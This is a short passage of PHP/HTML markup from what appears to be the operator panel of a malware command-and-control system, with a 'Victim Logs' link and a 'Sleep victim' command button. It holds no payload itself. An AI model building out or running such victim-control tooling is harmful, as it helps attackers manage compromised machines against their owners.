...
<div class="container bg-light">
    <div>
        <div class="row">
            <div class="col-2"></div>
            <div class="col-1">
                <a class="btn btn-primary mt-3 justify-content-center"
                    href="log?user_identifier=<?=htmlspecialchars($user_id)?>" role="button">Victim Logs</a>
                <button class="btn btn-success mt-1 justify-content-center" type="submit" form="form_command"
                    name="send_command" value="Send!">Sleep victim</button>
